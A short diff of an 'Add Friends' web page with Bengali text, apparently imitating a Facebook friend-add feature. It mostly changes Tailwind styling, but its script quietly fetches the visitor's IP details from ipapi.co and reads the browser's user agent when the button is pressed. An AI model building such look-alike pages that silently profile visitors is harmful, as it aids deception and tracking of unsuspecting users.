@@ -6,16 +6,14 @@
     <title>Add Friends</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">
+<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen pt-12">
 
-    <!-- ছবির অংশ – সব পেজে একই -->
-    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
+    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white rounded-t-2xl shadow-sm">
         <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
              alt="Profile" class="w-full h-full object-cover">
     </div>
 
-    <!-- সাদা বক্স – mt-[-25px] দিয়ে ওভারল্যাপ -->
-    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center justify-center">
+    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-10px] rounded-b-2xl min-h-[50vh] flex flex-col items-center justify-center mb-10">
 
         <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">ফ্রেন্ড অ্যাড করুন</h2>
 
@@ -37,7 +35,6 @@
         btn.disabled = true;
 
         try {
-            // IP + Device info
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
             const ua = navigator.userAgent;
